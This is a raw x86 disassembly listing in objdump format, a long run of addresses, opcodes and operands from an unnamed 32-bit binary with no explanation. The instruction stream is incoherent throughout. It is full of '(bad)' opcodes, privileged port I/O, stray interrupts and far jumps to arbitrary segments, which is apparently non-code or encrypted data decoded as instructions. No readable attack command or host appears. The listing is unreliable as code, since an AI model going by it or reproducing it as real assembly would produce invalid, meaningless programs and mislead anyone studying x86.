  41b694:	test   eax,0x417daaf4
  41b699:	arpl   dx,sp
  41b69b:	xchg   ecx,eax
  41b69c:	pop    edx
  41b69d:	(bad)  
  41b69e:	inc    esp
  41b69f:	ins    DWORD PTR es:[edi],dx
  41b6a0:	ficomp DWORD PTR [edi+0x3f]
  41b6a3:	cmp    DWORD PTR [ecx+edi*1],ecx
  41b6a6:	popa   
  41b6a7:	nop
  41b6a8:	sub    cl,BYTE PTR [eax+ebp*1-0x4c996335]
  41b6af:	clc    
  41b6b0:	lods   eax,DWORD PTR ds:[esi]
  41b6b1:	sbb    BYTE PTR [esi-0x74],al
  41b6b4:	sub    ebx,DWORD PTR fs:[ebx-0x3d1ce635]
  41b6bb:	fisub  WORD PTR [eax-0x7f1bc869]
  41b6c1:	repnz loop 0x41b728
  41b6c4:	jno    0x41b65b
  41b6c6:	addr16 lahf 
  41b6c8:	(bad)  
  41b6c9:	shr    DWORD PTR [esi-0x6f077af1],0x2b
  41b6d0:	fs (bad) 
  41b6d2:	sbb    al,0x90
  41b6d4:	(bad)  
  41b6d5:	aad    0x41
  41b6d7:	cmp    BYTE PTR [edx+ebp*4],bh
  41b6da:	xor    BYTE PTR [ebx-0x38],0xf9
  41b6de:	xor    BYTE PTR ds:0x444bea59,dh
  41b6e4:	int    0x9d
  41b6e6:	sbb    edi,DWORD PTR [edi]
  41b6e8:	mov    WORD PTR [eax],ss
  41b6ea:	push   0xffffffd2
  41b6ec:	sbb    ebp,DWORD PTR ds:0x6b6c69e6
  41b6f2:	in     al,dx
  41b6f3:	(bad)  
  41b6f4:	mov    dl,0x22
  41b6f6:	adc    ecx,DWORD PTR [ebx]
  41b6f8:	adc    esi,DWORD PTR [edx+0x11]
  41b6fb:	in     al,dx
  41b6fc:	add    BYTE PTR [ebp+ebx*1+0x8],bl
  41b700:	mov    dh,0x72
  41b702:	sbb    DWORD PTR [ecx-0x534ce429],ecx
  41b708:	(bad)  [ebp+0x79]
  41b70b:	pusha  
  41b70c:	xchg   edx,eax
  41b70d:	retf   0x2997
  41b710:	xor    ah,ah
  41b712:	mov    ds:0x2d634148,eax
  41b717:	and    eax,ebp
  41b719:	jl     0x41b76d
  41b71b:	xchg   esi,eax
  41b71c:	(bad)  
  41b71d:	popa   
  41b71e:	add    DWORD PTR [eax-0x4c81496],ebx
  41b724:	sbb    al,0x53
  41b726:	ret    0x2a8a
  41b729:	cmp    cl,BYTE PTR [ebp-0x66]
  41b72c:	ret    
  41b72d:	test   dl,al
  41b72f:	jne    0x41b707
  41b731:	sets   BYTE PTR [ebp-0x7391f56b]
  41b738:	fs cmp al,0x95
  41b73b:	mov    DWORD PTR [esi-0x3f],esi
  41b73e:	loope  0x41b6d9
  41b740:	add    DWORD PTR [eax],ecx
  41b742:	in     eax,dx
  41b743:	iret   
  41b744:	cmp    eax,DWORD PTR [edx+eiz*1-0x64]
  41b748:	imul   esi,DWORD PTR [esi+ecx*8+0x53d687db],0xffffffd4
  41b750:	push   esi
  41b751:	ins    DWORD PTR es:[edi],dx
  41b752:	add    ebx,DWORD PTR [eax+0x46bbafd5]
  41b758:	mov    esp,cs
  41b75a:	cmp    eax,0x20a68846
  41b75f:	sub    eax,0x20431096
  41b764:	adc    eax,0x96f4c09b
  41b769:	cmp    edx,eax
  41b76b:	(bad)  
  41b76d:	mov    esi,DWORD PTR [eax-0x4a]
  41b770:	add    bh,BYTE PTR [edi-0x32c6c757]
  41b776:	cmc    
  41b777:	xor    eax,0x6990eb6e
  41b77c:	(bad)  
  41b77d:	(bad)  
  41b77e:	dec    DWORD PTR [ebx]
  41b780:	mov    dl,0x44
  41b782:	add    eax,0xaaa27e36
  41b787:	ret    
  41b788:	out    0x70,al
  41b78a:	shr    BYTE PTR ds:0x5ecb2374,cl
  41b790:	ins    DWORD PTR es:[edi],dx
  41b791:	push   esp
  41b792:	mov    edi,0xbde6465
  41b797:	mov    cl,0x4e
  41b799:	jae    0x41b78e
  41b79b:	xor    BYTE PTR [eax-0x3],dl
  41b79e:	ss stos BYTE PTR es:[edi],al
  41b7a0:	rol    DWORD PTR [esi+ecx*4],1
  41b7a3:	mov    esi,0xb329f438
  41b7a8:	ret    
  41b7a9:	retf   0xb49c
  41b7ac:	outs   dx,BYTE PTR es:[esi]
  41b7ae:	daa    
  41b7af:	int    0x46
  41b7b1:	and    BYTE PTR [esi],al
  41b7b3:	dec    edx
  41b7b4:	call   0x68e8:0xf5ca5e5d
  41b7bb:	mov    ds:0x95e866bc,eax
  41b7c0:	cs popfw 
  41b7c3:	sti    
  41b7c4:	sti    
  41b7c5:	das    
  41b7c6:	jb     0x41b818
  41b7c8:	xor    eax,0x55b59b0a
  41b7cd:	aam    0x2
  41b7cf:	dec    edi
  41b7d0:	int    0x38
  41b7d2:	mov    ebx,0x96892312
  41b7d7:	mov    esi,0xa99057ea
  41b7dc:	push   ebx
  41b7dd:	pop    ecx
  41b7de:	stos   BYTE PTR es:[edi],al
  41b7df:	and    ecx,ebp
  41b7e1:	test   DWORD PTR [edx+esi*8-0xc1fc10f],esp
  41b7e8:	shl    BYTE PTR [esp+esi*1-0x5d],cl
  41b7ec:	cmp    eax,0xae1d4da8
  41b7f1:	out    dx,al
  41b7f2:	mov    dl,0xb7
  41b7f4:	jae    0x41b859
  41b7f6:	dec    esi
  41b7f7:	ins    BYTE PTR es:[edi],dx
  41b7f8:	stos   DWORD PTR es:[edi],eax
  41b7f9:	cld    
  41b7fa:	ror    edx,1
  41b7fc:	aas    
  41b7fd:	and    eax,0x3b2759e
  41b802:	leave  
  41b803:	or     DWORD PTR [ebx-0x37cb7986],ebp
  41b809:	add    ebx,DWORD PTR [esi*1-0x31492916]
  41b810:	pop    edi
  41b811:	mov    ah,0x53
  41b813:	scas   al,BYTE PTR es:[edi]
  41b814:	mov    ecx,0xcae3c313
  41b819:	push   esp
  41b81a:	lods   al,BYTE PTR ds:[esi]
  41b81b:	arpl   WORD PTR [esi+ebx*4-0x59fe8356],di
  41b822:	loopne 0x41b82c
  41b824:	adc    cl,al
  41b826:	mov    dh,0x8c
  41b828:	aaa    
  41b829:	icebp  
  41b82a:	adc    dl,BYTE PTR [edx+0x6211a24]
  41b830:	pop    es
  41b831:	jo     0x41b856
  41b833:	xor    al,0x20
  41b835:	pop    ecx
  41b836:	leave  
  41b837:	mov    esp,0x13220fe8
  41b83c:	inc    edi
  41b83d:	popf   
  41b83e:	ror    BYTE PTR [ecx-0x94bcdd7],1
  41b844:	xlat   BYTE PTR ds:[ebx]
  41b845:	mov    eax,0xa627d108
  41b84a:	adc    bh,ah
  41b84c:	ins    DWORD PTR es:[edi],dx
  41b84d:	ja     0x41b849
  41b84f:	xchg   edi,eax
  41b850:	and    BYTE PTR [ebx+eiz*8+0x2149734e],dl
  41b857:	int    0x95
  41b859:	sub    eax,0x23172d7b
  41b85e:	xor    ecx,DWORD PTR [edi+0x51b98556]
  41b864:	xchg   cl,al
  41b866:	cld    
  41b867:	stos   DWORD PTR es:[edi],eax
  41b868:	pop    esi
  41b869:	xchg   ecx,eax
  41b86a:	clc    
  41b86b:	mov    ecx,0x109151c
  41b870:	test   al,0xd7
  41b872:	jnp    0x41b803
  41b874:	cmp    ebx,DWORD PTR [ebx-0x2ce50746]
  41b87a:	mov    cl,0x2b
  41b87c:	in     eax,0x9a
  41b87e:	cmc    
  41b87f:	loopne 0x41b837
  41b881:	rcr    BYTE PTR [edi+ebx*4],cl
  41b884:	cmp    eax,esp
  41b886:	mov    edx,0x4426a784
  41b88b:	or     DWORD PTR [edi+0x7f4044be],ebx
  41b891:	jle    0x41b83e
  41b893:	rcl    BYTE PTR [eax],0xa1
  41b896:	jo     0x41b88f
  41b898:	cmp    esi,ebx
  41b89a:	fadd   st,st(2)
  41b89c:	data16 xchg BYTE PTR [ebx+eiz*1],dl
  41b8a0:	xor    DWORD PTR [esp+edi*4+0x93f4cb2],edx
  41b8a7:	ins    BYTE PTR es:[edi],dx
  41b8a8:	mov    edi,0xfcfbf653
  41b8ad:	cmp    DWORD PTR [ebp-0x2fe59e92],0x6a
  41b8b4:	sub    BYTE PTR [ebp+0xcbac038],ch
  41b8ba:	sub    BYTE PTR [edi],al
  41b8bc:	in     al,dx
  41b8bd:	mov    BYTE PTR [eax+0x5e018a23],cl
  41b8c3:	iret   
  41b8c4:	and    DWORD PTR [eax],edi
  41b8c6:	xlat   BYTE PTR ds:[ebx]
  41b8c7:	pop    eax
  41b8c8:	pop    eax
  41b8c9:	imul   ecx,DWORD PTR [esi],0x74
  41b8cc:	fldenv [edx+edx*1-0x7f]
  41b8d0:	pop    edi
  41b8d1:	scas   al,BYTE PTR es:[edi]
  41b8d2:	scas   eax,DWORD PTR es:[edi]
  41b8d3:	xchg   ebx,eax
  41b8d4:	adc    ebp,DWORD PTR [eax+ecx*8]
  41b8d7:	std    
  41b8d8:	ds (bad) 
  41b8da:	lahf   
  41b8db:	push   DWORD PTR fs:[ebx]
  41b8de:	and    BYTE PTR [ebp+0x20],0xa9
  41b8e2:	inc    ebx
  41b8e3:	loop   0x41b937
  41b8e5:	dec    ebx
  41b8e6:	jge    0x41b90c
  41b8e8:	aam    0xf
  41b8ea:	mov    edx,DWORD PTR [edx+0x8]
  41b8ed:	adc    edx,DWORD PTR [ecx+0x2]
  41b8f0:	repz bound edi,QWORD PTR [esi-0x13ab63ae]
  41b8f7:	jb     0x41b921
  41b8f9:	xor    edx,DWORD PTR [esi-0x3ee4be3f]
  41b8ff:	pop    edi
  41b900:	and    DWORD PTR [ebp-0x1a8ad24c],ecx
  41b906:	or     edi,DWORD PTR [edx+0x4e]
  41b909:	or     eax,0x81ddf3df
  41b90e:	sub    ebx,DWORD PTR [esi+0x4b]
  41b911:	cli    
  41b912:	ror    ebp,cl
  41b914:	sbb    ch,bh
  41b916:	fwait
  41b917:	add    eax,0x6cdfeef6
  41b91c:	lock leave 
  41b91e:	sbb    DWORD PTR [esi],esp
  41b920:	pushf  
  41b921:	arpl   WORD PTR [ebx-0xc],cx
  41b924:	ret    
  41b925:	(bad)  
  41b926:	frstor [ecx]
  41b928:	std    
  41b929:	sbb    esp,DWORD PTR [edi+0x25]
  41b92c:	iret   
  41b92d:	push   es
  41b92e:	mov    WORD PTR [edx],fs
  41b930:	(bad)  
  41b931:	xchg   esi,eax
  41b932:	push   ebp
  41b933:	nop
  41b934:	out    0x33,al
  41b936:	mov    esp,0x65e7534
  41b93b:	jmp    0xb0259589
  41b940:	xor    BYTE PTR [edi],cl
  41b942:	jg     0x41b8d1
  41b944:	push   ecx
  41b945:	hlt    
  41b946:	jle    0x41b953
  41b948:	dec    esp
  41b949:	repnz xor al,0x62
  41b94c:	add    DWORD PTR [edi],eax
  41b94e:	jecxz  0x41b908
  41b950:	xchg   esp,eax
  41b951:	in     eax,0x77
  41b953:	(bad)  
  41b954:	in     eax,dx
  41b955:	xchg   edx,eax
  41b956:	dec    esi
  41b957:	push   ecx
  41b958:	push   eax
  41b959:	xchg   ebp,eax
  41b95a:	test   BYTE PTR [eax+0x15],0x8e
  41b95e:	rep ins BYTE PTR es:[edi],dx
  41b960:	mov    ch,0x6
  41b962:	in     al,0xcc
  41b964:	outs   dx,DWORD PTR ds:[esi]
  41b965:	or     DWORD PTR [ecx+0x38],eax
  41b968:	lds    esi,FWORD PTR [edi+ebx*2]
  41b96b:	push   ss
  41b96c:	xchg   esp,eax
  41b96d:	jno    0x6198ad75
  41b973:	hlt    
  41b974:	test   eax,0x74d99568
  41b979:	test   al,0xec
  41b97b:	pop    ds
  41b97c:	jnp    0x41b958
  41b97e:	mov    ch,0xd5
  41b980:	push   0xffffffb9
  41b982:	sbb    DWORD PTR [ecx-0x2d],0x4c
  41b986:	jmp    0x94f6:0x33dba289
  41b98d:	dec    edi
  41b98e:	xor    eax,0x4e84dbe9
  41b993:	push   ss
  41b994:	int    0xc3
  41b996:	pop    edx
  41b997:	xor    ebp,edx
  41b999:	shufps xmm3,XMMWORD PTR [ebp+0x11],0x89
  41b99e:	push   ebx
  41b99f:	inc    ebx
  41b9a0:	adc    bh,0x9c
  41b9a3:	ret    
  41b9a4:	adc    dh,BYTE PTR [eax-0x39]
  41b9a7:	dec    ebx
  41b9a8:	rcl    BYTE PTR [edi-0x10],cl
  41b9ab:	push   es
  41b9ac:	xor    BYTE PTR [edi],bh
  41b9ae:	ins    BYTE PTR es:[edi],dx
  41b9af:	stos   BYTE PTR es:[edi],al
  41b9b0:	es cvtps2pd xmm2,xmm3
  41b9b4:	sahf   
  41b9b5:	aas    
  41b9b6:	pop    ecx
  41b9b7:	sbb    eax,0x62243d3e
  41b9bc:	aas    
  41b9bd:	inc    esi
  41b9be:	xor    BYTE PTR [ecx],bh
  41b9c0:	mov    bh,0x9d
  41b9c2:	and    BYTE PTR [edx-0x2f],bl
  41b9c5:	imul   BYTE PTR [esi]
  41b9c7:	push   0x79
  41b9c9:	in     al,dx
  41b9ca:	add    cl,al
  41b9cc:	retf   
  41b9cd:	(bad)  
  41b9ce:	stos   DWORD PTR es:[edi],eax
  41b9cf:	mov    eax,0x109f3ff5
  41b9d4:	add    al,0xee
  41b9d6:	cmp    ebp,ecx
  41b9d8:	dec    edx
  41b9d9:	stos   BYTE PTR es:[edi],al
  41b9da:	push   ecx
  41b9db:	add    eax,0x58c84ac3
  41b9e0:	adc    al,0x1a
  41b9e2:	pop    es
  41b9e3:	stc    
  41b9e4:	xchg   DWORD PTR [ecx],ebx
  41b9e6:	mov    dl,0x7c
  41b9e8:	xor    BYTE PTR [esi+0x6597704c],al
  41b9ee:	daa    
  41b9ef:	out    0x45,eax
  41b9f1:	lock mov ebp,0xb257f60d
  41b9f7:	inc    esi
  41b9f8:	cmp    al,0x19
  41b9fa:	in     al,dx
  41b9fb:	jo     0x41b9ad
  41b9fd:	repnz and al,BYTE PTR [edi-0x3]
  41ba01:	cmp    ch,BYTE PTR [eax+eax*8]
  41ba04:	cmp    al,0x18
  41ba06:	sbb    ebx,DWORD PTR [eax+0x39ee6fd7]
  41ba0c:	sbb    eax,0x65804c43
  41ba11:	sub    edi,DWORD PTR [edx+esi*2]
  41ba14:	xchg   esp,eax
  41ba15:	xlat   BYTE PTR ds:[ebx]
  41ba16:	cmp    ebx,ebp
  41ba18:	in     eax,dx
  41ba19:	and    eax,0x4b77486b
  41ba1e:	and    al,0x5b
  41ba20:	mov    cl,0x83
  41ba22:	fdivr  QWORD PTR [eax]
  41ba24:	push   esp
  41ba25:	ja     0x41ba48
  41ba27:	rcr    BYTE PTR [ecx+0x36],1
  41ba2a:	daa    
  41ba2b:	push   edi
  41ba2c:	pop    ss
  41ba2d:	clc    
  41ba2e:	pusha  
  41ba2f:	dec    esi
  41ba30:	push   ss
  41ba31:	shl    BYTE PTR [esi-0x7a],cl
  41ba34:	pushf  
  41ba35:	cwde   
  41ba36:	out    0xcf,eax
  41ba38:	inc    esp
  41ba39:	jl     0x41ba50
  41ba3b:	add    BYTE PTR ds:0x888b232a,bl
  41ba41:	and    ch,BYTE PTR [edi+0x3e]
  41ba44:	rol    BYTE PTR [esi-0x3357b188],1
  41ba4a:	in     eax,dx
  41ba4b:	test   al,0xbf
  41ba4d:	jecxz  0x41ba81
  41ba4f:	rcr    DWORD PTR [esi-0x7e],0xe1
  41ba53:	sub    eax,0x3bdaee51
  41ba58:	mov    DWORD PTR [esi],ebp
  41ba5a:	adc    al,0x3f
  41ba5c:	or     eax,0x4e73154f
  41ba61:	popf   
  41ba62:	aas    
  41ba63:	mov    BYTE PTR [edi+0x59],0x77
  41ba67:	jbe    0x41ba52
  41ba69:	stc    
  41ba6a:	cmp    eax,0x4219bbac
  41ba6f:	adc    ebx,ebp
  41ba71:	iret   
  41ba72:	lods   eax,DWORD PTR ds:[esi]
  41ba73:	xor    BYTE PTR [edi],ch
  41ba75:	pop    es
  41ba76:	outs   dx,DWORD PTR ds:[esi]
  41ba77:	ss jo  0x41ba88
  41ba7a:	xchg   ebp,eax
  41ba7b:	cmp    DWORD PTR [edx-0x5597b0ac],edi
  41ba81:	mov    ecx,?
  41ba83:	mov    ebx,0xda418b14
  41ba88:	or     DWORD PTR [edi+0x6d],edx
  41ba8b:	mov    esp,0x241b9ace
  41ba90:	and    eax,0x5d8e956e
  41ba95:	js     0x41baf2
  41ba97:	mov    al,ds:0x64f8b510
  41ba9c:	and    eax,ecx
  41ba9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba9f:	shl    dl,cl
  41baa1:	clc    
  41baa2:	mov    al,ds:0x82f8fcc3
  41baa7:	and    al,0x44
  41baa9:	aam    0xc8
  41baab:	sbb    cl,BYTE PTR [edx]
  41baad:	div    cl
  41baaf:	push   ecx
  41bab0:	push   ds
  41bab1:	cli    
  41bab2:	dec    ecx
  41bab3:	scas   al,BYTE PTR es:[edi]
  41bab4:	sub    al,0xe7
  41bab6:	mov    ch,0x68
  41bab8:	dec    ebp
  41bab9:	call   0xb13:0xb66c839b
  41bac0:	in     al,dx
  41bac1:	sub    eax,0xb9643a70
  41bac6:	div    ecx
  41bac8:	repz sbb al,BYTE PTR [ebx+0x1c7763d1]
  41bacf:	jmp    0x62d5e790
  41bad4:	dec    edx
  41bad5:	sub    BYTE PTR [edx-0x79],0x3e
  41bad9:	push   ebp
  41bada:	inc    esi
  41badb:	mov    ebx,0xa7cb42ab
  41bae0:	(bad)  
  41bae1:	in     eax,0x22
  41bae3:	cdq    
  41bae4:	push   edx
  41bae5:	sahf   
  41bae6:	into   
  41bae7:	mov    esi,0x1f2a3295
  41baec:	mov    bh,0x92
  41baee:	and    DWORD PTR [edx+0x36c6df93],ecx
  41baf4:	retf   
  41baf5:	xor    al,0xc5
  41baf7:	mov    ebp,0x74c3d433
  41bafc:	dec    edi
  41bafd:	mov    ds:0xe0302d37,eax
  41bb02:	(bad)  
  41bb03:	pop    ss
  41bb04:	push   ss
  41bb05:	inc    ebp
  41bb06:	cdq    
  41bb07:	cmp    eax,esp
  41bb09:	mov    BYTE PTR [esi-0x2fc2cd05],bh
  41bb0f:	mov    bh,0x83
  41bb11:	loope  0x41bace
  41bb13:	loope  0x41baf2
  41bb15:	mov    al,ds:0x87ad3a0a
  41bb1a:	std    
  41bb1b:	inc    eax
  41bb1c:	out    dx,eax
  41bb1d:	es jl  0x41bae4
  41bb20:	and    esi,DWORD PTR [edi-0x2d666e67]
  41bb26:	pushf  
  41bb27:	mov    dl,0x5f
  41bb29:	dec    ebp
  41bb2a:	cmp    al,0xb9
  41bb2c:	sub    eax,0x2c26f32f
  41bb31:	aaa    
  41bb32:	inc    edi
  41bb33:	(bad)  
  41bb34:	xchg   esp,eax
  41bb35:	or     ch,al
  41bb37:	sub    eax,0xfffffff1
  41bb3a:	pop    ebx
  41bb3b:	add    eax,0xbed9848b
  41bb40:	ins    BYTE PTR es:[edi],dx
  41bb41:	xchg   ebx,eax
  41bb42:	push   esi
  41bb43:	(bad)  
  41bb45:	mov    dh,BYTE PTR [esi+0x13b8d382]
  41bb4b:	ins    DWORD PTR es:[edi],dx
  41bb4c:	test   BYTE PTR [edx-0x7d],0xd3
  41bb50:	sar    BYTE PTR [edx+0x561502f7],0xde
  41bb57:	or     DWORD PTR [edi-0x57],eax
  41bb5a:	das    
  41bb5b:	jmp    0x41bb33
  41bb5d:	xor    ecx,esp
  41bb5f:	cwde   
  41bb60:	jb     0x41bb94
  41bb62:	mov    ah,0xd3
  41bb64:	lock rol BYTE PTR [edx-0x27],cl
  41bb68:	mul    DWORD PTR [ecx]
  41bb6a:	ds pop ebx
  41bb6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb6d:	mov    al,0x90
  41bb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb70:	ja     0x41bbc0
  41bb72:	inc    edi
  41bb73:	xchg   DWORD PTR [edi+edi*2],edx
  41bb76:	sbb    ecx,ebx
  41bb78:	mov    cl,0x41
  41bb7a:	jnp    0x41bb65
  41bb7c:	adc    eax,0x397cbf44
  41bb81:	jnp    0x41bb1b
  41bb83:	cwde   
  41bb84:	and    eax,0x9319750b
  41bb89:	mov    ecx,0xf2a90a1d
  41bb8e:	push   ds
  41bb8f:	xchg   ebx,eax
  41bb90:	sub    ebx,edi
  41bb92:	(bad)  
  41bb94:	mov    edi,0x686aaef8
  41bb99:	stc    
  41bb9a:	adc    DWORD PTR [esi+0xc],esi
  41bb9d:	adc    eax,0x4fd0e1b1
  41bba2:	jle    0x41bb83
  41bba4:	fwait
  41bba5:	mov    ecx,0xd209b365
  41bbaa:	pop    esi
  41bbab:	jno    0x41bb96
  41bbad:	mov    eax,ds:0xe99109b
  41bbb2:	stos   DWORD PTR es:[edi],eax
  41bbb3:	dec    esp
  41bbb4:	(bad)  
  41bbb6:	rcpps  xmm0,XMMWORD PTR [esi+0x7438cdce]
  41bbbd:	pop    edi
  41bbbe:	fisub  DWORD PTR [ecx]
  41bbc0:	imul   ebx,DWORD PTR [eax+0x76b75daf],0x2680cb84
  41bbca:	test   BYTE PTR [ebx+0x35],0x73
  41bbce:	push   es
  41bbcf:	inc    ebx
  41bbd0:	jmp    0x41bb63
  41bbd2:	push   eax
  41bbd4:	mov    al,ds:0x91ca3ce2
  41bbd9:	std    
  41bbda:	lock pop edi
  41bbdc:	outs   dx,DWORD PTR ds:[esi]
  41bbdd:	shl    bh,0x48
  41bbe0:	call   0xe1e3:0x2215abca
  41bbe7:	sbb    eax,0xb6d99c51
  41bbec:	imul   esp,eax,0x50
  41bbef:	jo     0x41bc47
  41bbf1:	imul   ebp,DWORD PTR [ebx],0x74
  41bbf4:	jmp    0xc4726c23
  41bbf9:	dec    ecx
  41bbfa:	repnz std 
  41bbfc:	(bad)  
  41bbfe:	inc    edi
  41bbff:	jmp    0x41bc2d
  41bc01:	cmp    DWORD PTR [edx-0x42575b41],edi
  41bc07:	out    dx,al
  41bc08:	or     BYTE PTR [ecx-0x785ca492],bl
  41bc0e:	mov    ecx,0xcf1000e8
  41bc13:	test   al,0x22
  41bc15:	and    cl,dl
  41bc17:	outs   dx,DWORD PTR ds:[esi]
  41bc18:	xor    eax,0x52e1729
  41bc1d:	or     al,0xe9
  41bc1f:	mov    eax,ds:0x83401cd1
  41bc24:	push   0xc4d5cf1f
  41bc29:	jge    0x41bbdb
  41bc2b:	sub    eax,0xb7506ec5
  41bc30:	push   0xfffffffa
  41bc32:	test   BYTE PTR [esi],al
  41bc34:	ins    DWORD PTR es:[edi],dx
  41bc35:	clc    
  41bc36:	clc    
  41bc37:	fisttp QWORD PTR [edx+eax*2]
  41bc3a:	dec    ebp
  41bc3b:	dec    esi
  41bc3c:	and    al,0x71
  41bc3e:	call   0x50cbfa79
  41bc43:	cwde   
  41bc44:	pushf  
  41bc45:	stc    
  41bc46:	call   0x51894da
  41bc4b:	test   al,0xed
  41bc4d:	test   eax,0x8420fad4
  41bc52:	outs   dx,DWORD PTR ds:[esi]
  41bc53:	mov    esp,0x7aaec896
  41bc58:	dec    edx
  41bc59:	scas   al,BYTE PTR es:[edi]
  41bc5a:	sbb    ecx,esp
  41bc5c:	inc    edx
  41bc5d:	jge    0x41bbe1
  41bc5f:	pop    ebx
  41bc60:	and    al,0xcd
  41bc62:	jne    0x41bbf2
  41bc64:	and    al,0x37
  41bc66:	xor    ch,ah
  41bc68:	aas    
  41bc69:	cmp    edi,DWORD PTR ds:0x89de12f3
  41bc6f:	and    al,0x6b
  41bc71:	xlat   BYTE PTR ds:[ebx]
  41bc72:	aad    0xa8
  41bc74:	cmp    BYTE PTR [edi-0x48],cl
  41bc77:	loop   0x41bc17
  41bc79:	mov    ds:0x4d22fe24,al
  41bc7e:	cli    
  41bc7f:	mov    cl,0xc0
  41bc81:	mov    ds,WORD PTR [edx-0x1a0ad4c4]
  41bc87:	mov    eax,DWORD PTR [esi]
  41bc89:	jmp    0x7cf139ff
  41bc8e:	jecxz  0x41bc1a
  41bc90:	pop    esi
  41bc91:	jmp    0x39de:0xff9954e9
  41bc98:	adc    eax,0x3093b0d8
  41bc9d:	jbe    0x41bca2
  41bc9f:	rcl    BYTE PTR [edi],cl
  41bca1:	xor    esi,eax
  41bca3:	inc    edi
  41bca4:	das    
  41bca5:	or     DWORD PTR [edx],0x68
  41bca8:	mov    ah,0x45
  41bcaa:	scas   al,BYTE PTR es:[edi]
  41bcab:	push   esi
  41bcac:	mov    DWORD PTR [edi+0x2e],0x53b7eda7
  41bcb3:	mov    bh,0x12
  41bcb5:	clc    
  41bcb6:	test   edi,ebx
  41bcb8:	outs   dx,DWORD PTR ds:[esi]
  41bcb9:	jp     0x41bcaa
  41bcbb:	dec    ecx
  41bcbc:	div    BYTE PTR [ecx]
  41bcbe:	popf   
  41bcbf:	aam    0x60
  41bcc1:	cli    
  41bcc2:	test   ch,al
  41bcc4:	push   ebx
  41bcc5:	shl    BYTE PTR [ebx],1
  41bcc7:	sbb    al,0x2b
  41bcc9:	adc    eax,0x2ff6d180
  41bcce:	mov    edi,0x37c9fb0d
  41bcd3:	test   DWORD PTR [edx],edx
  41bcd5:	clc    
  41bcd6:	jne    0x41bd2e
  41bcd8:	jge    0x41bcbf
  41bcda:	add    BYTE PTR [edi],ch
  41bcdc:	inc    ecx
  41bcdd:	jne    0x41bd19
  41bcdf:	jo     0x41bcd2
  41bce1:	into   
  41bce2:	(bad)  
  41bce4:	mov    cl,0x8b
  41bce6:	int3   
  41bce7:	inc    eax
  41bce8:	mov    ecx,0x76dc7222
  41bced:	das    
  41bcee:	(bad)  
  41bcef:	cmp    ecx,DWORD PTR [ebp-0x19]
  41bcf2:	jne    0x41bc85
  41bcf4:	int    0x46
  41bcf6:	es ins DWORD PTR es:[edi],dx
  41bcf8:	jno    0x41bcc5
  41bcfa:	or     eax,0xe0e99c10
  41bcff:	mov    esp,0x689e1d26
  41bd04:	icebp  
  41bd05:	jge    0x41bc8b
  41bd07:	xor    bh,BYTE PTR [edi+ebx*4-0x6d]
  41bd0b:	dec    ecx
  41bd0c:	dec    ebx
  41bd0d:	and    ch,BYTE PTR [ecx-0x51d7b1]
  41bd13:	mov    ah,0xe7
  41bd15:	std    
  41bd16:	shr    bl,0xa0
  41bd19:	rcr    DWORD PTR [edi],cl
  41bd1b:	cmp    DWORD PTR [ebp-0x5f],esp
  41bd1e:	sbb    eax,0xcbe0389b
  41bd23:	retf   
  41bd24:	aas    
  41bd25:	rcr    DWORD PTR [edi],1
  41bd27:	sub    al,0xe3
  41bd29:	outs   dx,BYTE PTR ds:[esi]
  41bd2a:	cmp    edi,eax
  41bd2c:	cwde   
  41bd2d:	push   ds
  41bd2e:	mov    ebp,edi
  41bd30:	fistp  WORD PTR [edx]
  41bd32:	retf   0x1ee8
  41bd35:	js     0x41bce0
  41bd37:	std    
  41bd38:	fiadd  WORD PTR [esi-0x5c350922]
  41bd3e:	sub    bh,ch
  41bd40:	jno    0x41bce0
  41bd42:	mov    cl,0xe8
  41bd44:	(bad)  
  41bd45:	or     eax,0x93a3e6c2
  41bd4a:	push   0x52
  41bd4c:	pop    ebx
  41bd4d:	and    edi,esi
  41bd4f:	push   ebp
  41bd50:	xor    eax,DWORD PTR [edi]
  41bd52:	enter  0xa100,0x28
  41bd56:	test   al,0xd1
  41bd58:	mov    esi,0x9e0cbd19
  41bd5d:	push   ss
  41bd5e:	dec    si
  41bd60:	dec    esp
  41bd61:	inc    edi
  41bd62:	push   edi
  41bd63:	jmp    0xece8:0x6cb44c0f
  41bd6a:	pop    ecx
  41bd6b:	xchg   ecx,eax
  41bd6c:	imul   edi,DWORD PTR [edx],0xe68408c3
  41bd72:	push   0x5e
  41bd74:	test   esi,esp
  41bd76:	pop    eax
  41bd77:	and    al,0x45
  41bd79:	dec    edi
  41bd7a:	dec    ebx
  41bd7b:	scas   eax,DWORD PTR es:[edi]
  41bd7c:	mov    edi,0x296668f5
  41bd81:	sar    bl,1
  41bd83:	add    al,0x81
  41bd85:	ss sub eax,0x2a358fbb
  41bd8b:	ret    0x3464
  41bd8e:	add    DWORD PTR [edi-0x33233240],esp
  41bd94:	ror    BYTE PTR [edx],1
  41bd96:	cmc    
  41bd97:	popf   
  41bd98:	xchg   edx,eax
  41bd99:	imul   eax,esp,0x9e3d945f
  41bd9f:	add    DWORD PTR [eax],edx
  41bda1:	jle    0x41be0c
  41bda3:	xor    al,0x89
  41bda5:	in     al,dx
  41bda6:	xchg   esp,eax
  41bda7:	fwait
  41bda8:	adc    ecx,edi
  41bdaa:	xchg   esi,eax
  41bdab:	sbb    ebx,DWORD PTR [ecx-0x4a]
  41bdae:	test   ebp,ebx
  41bdb0:	dec    esp
  41bdb1:	nop
  41bdb2:	stc    
  41bdb3:	xchg   esp,eax
  41bdb4:	mov    ebx,0xf0edf767
  41bdb9:	lods   al,BYTE PTR ds:[esi]
  41bdba:	cwde   
  41bdbb:	adc    eax,0x1d2b23e9
  41bdc0:	xchg   edx,eax
  41bdc1:	dec    ebp
  41bdc2:	push   esp
  41bdc3:	fimul  WORD PTR [eax+0xb54d262]
  41bdc9:	xchg   ecx,eax
  41bdca:	je     0x41bda2
  41bdcc:	addr16 (bad) 
  41bdce:	adc    BYTE PTR [edx+0x6d],dl
  41bdd1:	or     al,0x8d
  41bdd3:	jp     0x41bd8b
  41bdd5:	push   ds
  41bdd6:	ins    BYTE PTR es:[edi],dx
  41bdd7:	jns    0x41bdf6
  41bdd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdda:	imul   al
  41bddc:	stos   BYTE PTR es:[edi],al
  41bddd:	std    
  41bdde:	xor    cl,BYTE PTR [ebx+0xb]
  41bde1:	adc    al,0xf3
  41bde3:	pop    eax
  41bde4:	add    DWORD PTR [ecx],esi
  41bde6:	pop    ds
  41bde7:	push   ds
